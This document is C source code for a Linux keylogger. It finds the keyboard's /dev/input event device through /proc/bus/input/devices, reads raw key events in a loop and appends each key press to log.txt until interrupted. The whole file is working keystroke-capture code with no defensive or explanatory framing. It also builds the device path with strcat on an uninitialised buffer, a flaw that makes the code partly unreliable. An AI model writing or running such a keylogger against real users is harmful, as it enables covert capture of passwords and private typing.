#include <linux/input.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <signal.h>

const char *keycode_to_char[256] = {
  "",
	"ESC",
	"1",
	"2",
	"3",
	"4",
	"5",
	"6",
	"7",
	"8",
	"9",
	"0",
	"-",
	"=",
	"BACKSPACE",
	"\t",
	"q",
	"w",
	"e",
	"r",
	"t",
	"y",
	"u",
	"i",
	"o",
	"p",
	"[",
	"]",
	"\n",
	"LEFT_CTRL",
	"a",
	"s",
	"d",
	"f",
	"g",
	"h",
	"j",
	"k",
	"l",
	";",
	"'",
	"LEFT_SHIFT",
	"\\",
	"z",
	"x",
	"c",
	"v",
	"b",
	"n",
	"m",
	",",
	".",
	"/",
	"RIGHT_SHIFT",
	"KPASTERISK",
	"LEFT_ALT",
	" ",
	"CAPSLOCK",
	"F1",
	"F2",
	"F3",
	"F4",
	"F5",
	"F6",
	"F7",
	"F8",
	"F9",
	"F10",
	"NUMLOCK",
	"SCROLLLOCK"
};

FILE *get_keyboard_file(){
	//the file /proc/bus/input/devices hold all I/O devices
	FILE * devices_file = fopen("/proc/bus/input/devices", "r");

	//devices_string will hold 1 line from the diveces_file at a time
	char devices_string[256];

	while(fgets(devices_string,256,devices_file)){
		printf("%s\n",devices_string);

		if(strstr(devices_string, "N: Name=") &&
		  (strstr(devices_string, "keyboard") ||
		   strstr(devices_string, "Keyboard") ||
		   strstr(devices_string, "KEYBOARD"))){

			//GET THE H: Handlers line
			for(int i=0;  i<4; i++){
				fgets(devices_string,256,devices_file);
			}

			//looking for the handler in that will be in /dev/input
			char *substring_ptr = strstr(devices_string, "event");
			if(substring_ptr == NULL){
				return NULL;
			}
			//saving the word that starts with "event" in handler
			char *handler = strtok(substring_ptr, " ");

			char keyboard_file_name[256];
			strcat(keyboard_file_name, "/dev/input/");
			strcat(keyboard_file_name, handler);
			strcat(keyboard_file_name, "");
			
			FILE * keyboard = fopen(keyboard_file_name, "r");
			return keyboard;
		}
	}
	
	return NULL;		
	
}


int running = 1;

void sig_handler( int signum){
	running = 0;
}

int main(int argc, char *argv[]){
	FILE * keyboard = get_keyboard_file();

	if(keyboard == NULL){
		printf("Error with keyboard file!\n");
		return 1;
	}

	//use appropriate location if you are using MacOS or Linux
	FILE * log_file = fopen("log.txt", "a");

	if(log_file == NULL){
		printf("Error with log.txt!\n");
		return 1;
	}

	signal(SIGINT, sig_handler);
	int event_bytes = 0;
	int event_size = sizeof(struct input_event);
	struct input_event events[3];
	char buffer[256];

	while(running){
		//the output of fread() is the number of events it reads
		event_bytes = fread(events, event_size, 3, keyboard);
		for(int i = 0; i < 3; i++){
			if(events[i].type == 1 && (events[i].value == 1 || events[i].value == 2)){
				fputs(keycode_to_char[events[i].code],log_file);
				fflush(log_file);
			}
		}
	}

	fclose(keyboard);
	fclose(log_file);
	return 0;

}
